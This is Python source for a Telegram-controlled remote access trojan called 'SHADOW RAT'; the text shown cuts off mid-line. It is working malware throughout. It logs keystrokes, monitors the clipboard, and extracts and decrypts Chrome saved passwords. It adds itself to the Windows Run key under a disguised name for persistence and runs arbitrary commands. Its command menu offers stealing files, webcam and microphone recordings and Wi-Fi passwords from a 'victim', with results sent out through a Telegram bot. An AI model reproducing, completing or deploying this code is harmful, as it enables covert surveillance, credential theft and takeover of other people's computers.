
import telebot
import os
import random
import pyttsx3
import pyautogui
import cv2
import ctypes
import time
import platform
import requests
import threading
import subprocess
import wave
import pyaudio
import numpy as np
from pynput import keyboard
import json
import shutil
from datetime import datetime
import sqlite3
import winreg
import hashlib
import tempfile
import zipfile
import psutil
import win32crypt
from Crypto.Cipher import AES
import base64

BOT_TOKEN: str = 'YOUR_BOT_TOKEN_HERE'
PASSWORD: str = '1234567B'
AUTH_USERS: set[int] = set()
current_directory: str = os.getcwd()
execute_mode: bool = False
waiting_for_upload: bool = False
keylogger_active: bool = False
keylog_listener = None
keylog_buffer: list[str] = []
mouse_mess_active: bool = False
execute_session: bool = False
clipboard_monitor_active: bool = False
usb_monitor_active: bool = False
network_monitor_active: bool = False
screenshot_on_key: bool = False
last_clipboard: str = ""
persistent_mode: bool = False
scheduled_timers: list[threading.Timer] = []

bot = telebot.TeleBot(BOT_TOKEN)

def authenticated(func: callable) -> callable:
    def wrapper(message: telebot.types.Message) -> None:
        if message.from_user.id not in AUTH_USERS:
            bot.send_message(message.chat.id, "Send /start first")
            return
        func(message)
    return wrapper

def on_key_press(key) -> None:
    global keylog_buffer, keylogger_active, screenshot_on_key
    if not keylogger_active:
        return
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
            if screenshot_on_key and key.char.isalnum():
                screenshot_path: str = f"key_screenshot_{int(time.time())}.png"
                pyautogui.screenshot(screenshot_path)
                time.sleep(0.3)
                os.remove(screenshot_path)
        else:
            keylog_buffer.append(f'[{key.name}]' if hasattr(key, 'name') else str(key))
    except:
        keylog_buffer.append(f'[{key}]')
    
    if len(keylog_buffer) >= 100:
        flush_keylogs()

def flush_keylogs() -> None:
    global keylog_buffer
    if keylog_buffer:
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            f.write(''.join(keylog_buffer))
        keylog_buffer = []

def start_keylogger() -> None:
    global keylogger_active, keylog_listener
    keylogger_active = True
    keylog_listener = keyboard.Listener(on_press=on_key_press)
    keylog_listener.start()

def stop_keylogger() -> None:
    global keylogger_active
    keylogger_active = False
    if keylog_listener:
        keylog_listener.stop()
    flush_keylogs()

def monitor_clipboard_background() -> None:
    global last_clipboard, clipboard_monitor_active
    while clipboard_monitor_active:
        try:
            result = subprocess.run(['powershell.exe', '-Command', 'Get-Clipboard'], 
                                  capture_output=True, text=True, timeout=2)
            if result.stdout and result.stdout.strip() != last_clipboard:
                last_clipboard = result.stdout.strip()
                with open('clipboard_history.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{time.time()}: {last_clipboard}\n")
        except:
            pass
        time.sleep(3)

def monitor_usb_devices() -> None:
    global usb_monitor_active
    known_drives: set[str] = set()
    while usb_monitor_active:
        try:
            current_drives: set[str] = {d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:\\')}
            new_drives: set[str] = current_drives - known_drives
            removed_drives: set[str] = known_drives - current_drives
            
            for drive in new_drives:
                with open('usb_log.txt', 'a') as f:
                    f.write(f"{datetime.now()}: USB INSERTED - {drive}:\\\n")
                    
            for drive in removed_drives:
                with open('usb_log.txt', 'a') as f:
                    f.write(f"{datetime.now()}: USB REMOVED - {drive}:\\\n")
                    
            known_drives = current_drives
        except:
            pass
        time.sleep(5)

def monitor_network_connections() -> None:
    global network_monitor_active
    while network_monitor_active:
        try:
            result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
            established: list[str] = [line for line in result.stdout.split('\n') if 'ESTABLISHED' in line]
            
            if len(established) > 20:
                with open('network_alert.txt', 'a') as f:
                    f.write(f"{datetime.now()}: High network activity - {len(established)} connections\n")
                    for conn in established[:5]:
                        f.write(f"  {conn}\n")
        except:
            pass
        time.sleep(30)

def decrypt_chrome_password(encrypted_value: bytes) -> str:
    try:
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
    except:
        try:
            local_state_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            
            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        except Exception:
            return "[CANNOT DECRYPT]"

def extract_chrome_passwords() -> list[tuple[str, str, str]]:
    passwords: list[tuple[str, str, str]] = []
    chrome_login_path: str = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    
    if os.path.exists(chrome_login_path):
        try:
            time.sleep(1)
            
            temp_db: str = os.path.join(tempfile.gettempdir(), "chrome_passwords.db")
            shutil.copy2(chrome_login_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0][:100]
                username = row[1] if row[1] else "[NO USERNAME]"
                
                if row[2]:
                    try:
                        decrypted_pwd = decrypt_chrome_password(row[2])
                        passwords.append((url, username, decrypted_pwd))
                    except:
                        passwords.append((url, username, "[DECRYPT FAILED]"))
                else:
                    passwords.append((url, username, "[NO PASSWORD]"))
            
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error: {e}")
    
    return passwords

def add_to_persistence() -> None:
    script_path: str = os.path.abspath(__file__)
    registry_path: str = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key_name: str = "WindowsSecurityHelper"
    os.system(f'reg add "{registry_path}" /v "{key_name}" /t REG_SZ /d "{script_path}" /f')

def remove_from_persistence() -> None:
    registry_path: str = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key_name: str = "WindowsSecurityHelper"
    os.system(f'reg delete "{registry_path}" /v "{key_name}" /f')

def get_system_uptime() -> str:
    try:
        uptime_seconds: float = time.time() - psutil.boot_time()
        days: int = int(uptime_seconds // 86400)
        hours: int = int((uptime_seconds % 86400) // 3600)
        minutes: int = int((uptime_seconds % 3600) // 60)
        return f"{days}d {hours}h {minutes}m"
    except:
        return "Unknown"

@bot.message_handler(commands=['start'])
def start_handler(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Password:")
    bot.register_next_step_handler(message, verify_password)

def verify_password(message: telebot.types.Message) -> None:
    if message.text == PASSWORD:
        AUTH_USERS.add(message.from_user.id)
        bot.send_message(message.chat.id, "SHADOW RAT Activated")
        bot.send_message(message.chat.id, f"Connected - {os.popen('whoami').read().strip()}")
        bot.send_message(message.chat.id, "Use /help")
    else:
        bot.send_message(message.chat.id, "Wrong password")

@bot.message_handler(commands=['help'])
@authenticated
def help_command(message: telebot.types.Message) -> None:
    help_text: str = """
COMMAND LIST:
/start - Connect to RAT
/help - Show this menu
/addstartup - Add to Windows startup
/deletestartup - Remove from Windows startup
/persistence - Enable persistence
/nopersistence - Disable persistence
/hide - Hide script file
/unhide - Unhide script file
/info - Get IP and location
/pcinfo - Detailed system info
/shortinfo - Basic system info
/sysinfo - Complete system information
/uptime - Show system uptime
/run [path] - Execute file
/files - List current directory files
/cd [path] - Change directory
/delete [path] - Delete file or folder
/rename [old] [new] - Rename file/folder
/mkdir [name] - Create directory
/rmdir [name] - Remove empty directory
/search [name] - Search files on C drive
/download [path] - Download file from victim
/upload - Upload file to victim
/downloadurl [url] [name] - Download from internet
/uploadfile [path] - Upload any file to Telegram
/metadata [path] - Show file metadata
/zip [folder] - Create zip archive
/unzip [file] - Extract zip archive
/tasklist - Show running processes
/taskkill [name] - Kill process by name
/processes - Detailed process list with CPU/RAM
/killpid [pid] - Kill process by ID
/shutdown - Shutdown computer
/restart - Restart computer
/sleep - Put computer to sleep
/lockpc - Lock computer
/logoff - Log off current user
/hibernate - Hibernate computer
/block - Block keyboard and mouse
/unblock - Unblock input
/keytype [text] - Type text
/keypress [key] - Press single key
/keypresstwo [k1] [k2] - Press two keys
/keypressthree [k1] [k2] [k3] - Press three keys
/mousemove [x] [y] - Move mouse to coordinates
/mouseclick - Left mouse click
/mouseright - Right mouse click
/mousemesstart - Start mouse movement mess
/mousemesstop - Stop mouse mess
/maximize - Maximize active window
/minimize - Minimize active window
/altf4 - Send Alt+F4 to close window
/fullvolume - Set volume to maximum
/volumeplus - Increase volume by 10
/volumeminus - Decrease volume by 10
/volume [0-100] - Set specific volume level
/mute - Mute system audio
/unmute - Unmute system audio
/keylogstart - Start keylogger
/keylogstop - Stop keylogger
/keylogdump - Download keylog file
/keylogscreenshot - Take screenshot on each key press
/clipboard - Show current clipboard
/changeclipboard [text] - Change clipboard content
/clipmonstart - Start clipboard monitoring
/clipmonstop - Stop clipboard monitoring
/usbmonitorstart - Monitor USB devices
/usbmonitorstop - Stop USB monitoring
/networkmonitorstart - Monitor network connections
/networkmonitorstop - Stop network monitoring
/wifilist - Show saved Wi-Fi networks
/wifipass [name] - Show Wi-Fi password
/netstat - Show active connections
/passwords - Extract Chrome saved passwords with decryption
/passwordsall - Extract passwords from all Chrome profiles
/chrome [url] - Open URL in Chrome
/edge [url] - Open URL in Edge
/firefox [url] - Open URL in Firefox
/screenshot - Take screenshot
/screenrecord [sec] - Record screen
/mic [sec] - Record microphone
/webscreen - Take webcam photo
/webcam [sec] - Record webcam video
/textspeech [text] - Text to speech
/say [text] - Speak text
/playsound [path] - Play audio file
/e [cmd] - Execute command (short output)
/ex [cmd] - Execute command (long output as file)
/execute - Start interactive shell session
/msg [type] [title] [text] - Show message box
/notify [title] [text] - Show notification
/disabletaskmgr - Disable Task Manager
/enabletaskmgr - Enable Task Manager
/users - Show system users
/whoami - Show current username
/apps - Show installed applications
/batteryinfo - Show battery information
/schedule [time] [command] - Schedule command execution
/listschedules - List scheduled tasks
/clearschedules - Clear all scheduled tasks
/wallpaper - Change desktop wallpaper
/cmdbomb - Open 10 CMD windows
"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['keylogstart'])
@authenticated
def keylog_start(message: telebot.types.Message) -> None:
    global keylogger_active
    if not keylogger_active:
        start_keylogger()
        bot.send_message(message.chat.id, "Keylogger started")
    else:
        bot.send_message(message.chat.id, "Keylogger already running")

@bot.message_handler(commands=['keylogstop'])
@authenticated
def keylog_stop(message: telebot.types.Message) -> None:
    global keylogger_active
    if keylogger_active:
        stop_keylogger()
        bot.send_message(message.chat.id, "Keylogger stopped")
    else:
        bot.send_message(message.chat.id, "Keylogger not running")

@bot.message_handler(commands=['keylogdump'])
@authenticated
def keylog_dump(message: telebot.types.Message) -> None:
    flush_keylogs()
    if os.path.exists('keylog.txt'):
        with open('keylog.txt', 'rb') as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.send_message(message.chat.id, "No keylogs found")

@bot.message_handler(commands=['keylogscreenshot'])
@authenticated
def keylog_screenshot_mode(message: telebot.types.Message) -> None:
    global screenshot_on_key
    screenshot_on_key = not screenshot_on_key
    status: str = "enabled" if screenshot_on_key else "disabled"
    bot.send_message(message.chat.id, f"Screenshot on key press {status}")

@bot.message_handler(commands=['addstartup'])
@authenticated
def add_startup(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Send full exe path:")
    bot.register_next_step_handler(message, save_startup_path)

def save_startup_path(message: telebot.types.Message) -> None:
    key_name: str = "WindowsHelper"
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{message.text}" /f')
    bot.send_message(message.chat.id, "Added to startup")

@bot.message_handler(commands=['deletestartup'])
@authenticated
def delete_startup(message: telebot.types.Message) -> None:
    key_name: str = "WindowsHelper"
    os.system(f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /f')
    bot.send_message(message.chat.id, "Removed from startup")

@bot.message_handler(commands=['persistence'])
@authenticated
def enable_persistence(message: telebot.types.Message) -> None:
    global persistent_mode
    add_to_persistence()
    persistent_mode = True
    bot.send_message(message.chat.id, "Persistence enabled - Script will run on boot")

@bot.message_handler(commands=['nopersistence'])
@authenticated
def disable_persistence(message: telebot.types.Message) -> None:
    global persistent_mode
    remove_from_persistence()
    persistent_mode = False
    bot.send_message(message.chat.id, "Persistence disabled")

@bot.message_handler(commands=['run'])
@authenticated
def run_file(message: telebot.types.Message) -> None:
    path: str = message.text.split('/run', 1)[1].strip()
    os.startfile(path)
    bot.send_message(message.chat.id, "File executed")

@bot.message_handler(commands=['whoami'])
@authenticated
def whoami_command(message: telebot.types.Message) -> None:
    result: str = os.popen('whoami').read().strip()
    bot.send_message(message.chat.id, f"User: {result}")

@bot.message_handler(commands=['users'])
@authenticated
def users_command(message: telebot.types.Message) -> None:
    result: str = os.popen('net user').read().strip()
    bot.send_message(message.chat.id, f"Users:\n{result[:4000]}")

@bot.message_handler(commands=['tasklist'])
@authenticated
def tasklist_command(message: telebot.types.Message) -> None:
    result: str = os.popen('tasklist').read().strip()
    chunks: list[str] = [result[i:i+4000] for i in range(0, len(result), 4000)]
    for chunk in chunks:
        bot.send_message(message.chat.id, f"Processes:\n{chunk}")

@bot.message_handler(commands=['taskkill'])
@authenticated
def taskkill_command(message: telebot.types.Message) -> None:
    task: str = message.text.split('/taskkill', 1)[1].strip()
    result: str = os.popen(f'taskkill /f /im {task}').read().strip()
    bot.send_message(message.chat.id, result)

@bot.message_handler(commands=['shutdown'])
@authenticated
def shutdown_command(message: telebot.types.Message) -> None:
    os.system('shutdown /s /f /t 0')
    bot.send_message(message.chat.id, "Shutting down")

@bot.message_handler(commands=['restart'])
@authenticated
def restart_command(message: telebot.types.Message) -> None:
    os.system('shutdown /r /f /t 0')
    bot.send_message(message.chat.id, "Restarting")

@bot.message_handler(commands=['sleep'])
@authenticated
def sleep_command(message: telebot.types.Message) -> None:
    ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
    bot.send_message(message.chat.id, "Sleep mode")

@bot.message_handler(commands=['lockpc'])
@authenticated
def lock_computer(message: telebot.types.Message) -> None:
    ctypes.windll.user32.LockWorkStation()
    bot.send_message(message.chat.id, "Computer locked")

@bot.message_handler(commands=['logoff'])
@authenticated
def logoff_user(message: telebot.types.Message) -> None:
    os.system('shutdown /l /f')
    bot.send_message(message.chat.id, "Logging off")

@bot.message_handler(commands=['hibernate'])
@authenticated
def hibernate_computer(message: telebot.types.Message) -> None:
    os.system('shutdown /h')
    bot.send_message(message.chat.id, "Hibernating")

@bot.message_handler(commands=['altf4'])
@authenticated
def altf4_command(message: telebot.types.Message) -> None:
    pyautogui.hotkey('alt', 'f4')
    bot.send_message(message.chat.id, "Alt+F4 pressed")

@bot.message_handler(commands=['cmdbomb'])
@authenticated
def cmdbomb_command(message: telebot.types.Message) -> None:
    for _ in range(10):
        os.system('start cmd')
    bot.send_message(message.chat.id, "Opened 10 CMD windows")

@bot.message_handler(commands=['msg'])
@authenticated
def msg_command(message: telebot.types.Message) -> None:
    parts: list[str] = message.text.split('/msg', 1)[1].strip().split()
    msg_type: str = parts[0]
    title: str = parts[1]
    text: str = ' '.join(parts[2:])
    types_map: dict[str, int] = {"info": 64, "warning": 48, "error": 16, "question": 32, "default": 0}
    code: int = types_map.get(msg_type, 0)
    os.system(f'mshta vbscript:Execute("msgbox ""{text}"", {code}, ""{title}"":close")')
    bot.send_message(message.chat.id, "Message displayed")

@bot.message_handler(commands=['notify'])
@authenticated
def show_notification(message: telebot.types.Message) -> None:
    parts: list[str] = message.text.split('/notify', 1)[1].strip().split(' ', 1)
    title: str = parts[0]
    text: str = parts[1] if len(parts) > 1 else ""
    os.system(f'powershell -Command "& {{$wshell = New-Object -ComObject Wscript.Shell; $wshell.Popup(\'{text}\', 0, \'{title}\', 48)}}"')
    bot.send_message(message.chat.id, "Notification sent")

@bot.message_handler(commands=['wallpaper'])
@authenticated
def wallpaper_command(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "First use /upload to send image, then send filen
